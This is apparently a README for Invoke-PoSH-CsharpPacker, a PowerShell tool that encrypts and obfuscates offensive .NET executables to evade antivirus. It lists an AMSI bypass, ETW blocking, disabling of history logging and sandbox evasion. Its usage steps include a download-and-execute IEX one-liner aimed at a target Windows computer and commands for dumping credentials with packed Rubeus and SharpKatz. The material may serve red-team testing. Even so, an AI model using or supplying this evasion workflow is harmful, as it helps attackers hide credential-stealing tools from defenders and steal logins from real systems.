### Invoke-PoSH-CsharpPacker
--------------------------------------
'Invoke-PoSH-CsharpPacker' allows to pack and encrypt offensive (C#) .NET executable files in order to bypass AV solutions such as Windows Defender.
It generates an obfuscated and encrypted PowerShell script that contains the (C#) .NET executable file that you want to pack.

#### FEATURES
  - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
  - AMSI bypass <i/>(bypass AMSI for Assembly.Load())</i>
  - Blocking Event Tracing for Windows (ETW)
  - Disabling PowerShell history logging
  - Basic sandbox evasion techniques (optional)
    - stop/exit if the PowerShell script is not run on a domain-joined Windows computer 
    - stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
    - wait for 60 seconds before execution
  
#### USAGE
  - Step 1. Generate an obfuscated & encrypted PowerShell script that contains your (C#) .NET executable file (e.g. Rubeus.exe, Sharpkatz.exe) stored locally or on a remote web server.  
```
PS C:\> Import-Module ./Invoke-PoSH-CsharpPacker.ps1
PS C:\> Invoke-PoSH-CsharpPacker -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
--- or ---
PS C:\> Invoke-PoSH-CsharpPacker -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1 -Sandbox
```
```
PS C:\> Import-Module ./Invoke-PoSH-CsharpPacker.ps1
PS C:\> Invoke-PoSH-CsharpPacker -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1 
--- or ---
PS C:\> Invoke-PoSH-CsharpPacker -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1 -Sandbox
```
  - Step 2. Download & execute the obfuscated & encrypted PowerShell script (that contains your (C#) .NET executable file) on a target Windows computer
```
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://URL/Packed-Csharp-binary.ps1'); 
--- or ---
PS C:\> WGET -URI https://URL/Packed-Csharp-binary.ps1 -OutFile C:\temp\Packed-Csharp-binary.ps1
PS C:\> Import-Module C:\temp\Packed-Csharp-binary.ps1
``` 
  - Step 3. Execute the packed version of your (C#) .NET executable file   
    - Generic command: ``` PS C:\> Invoke-Packed-NET-Executable argument1 argument2 argument3 ...``` 
    - Exemple with a packed version of Rubeus.exe: ```Invoke-Packed-NET-Executable logonsession /current```  
    - Example with a packed version of Sharpkatz.exe: ```Invoke-Packed-NET-Executable --Command logonpasswords``` 


#### LICENSE
  - GNU General Public License v3.0
